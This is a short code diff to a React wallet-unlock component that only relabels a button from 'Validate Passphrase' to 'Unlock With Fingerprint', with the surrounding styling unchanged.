@@ -186,7 +186,7 @@ const UnlockPiWallet = () => {
           onClick={handleSubmit}
           className="w-full border-2 bg-white py-3 rounded-lg text-lg font-medium hover:text-white hover:bg-[#703D92] transition"
         >
-          Validate Passphrase
+          Unlock With Fingerprint
         </button>
 
         <button className="w-full mt-4 border-2 bg-[#703D92] text-white py-3 rounded-lg text-lg font-medium transition">
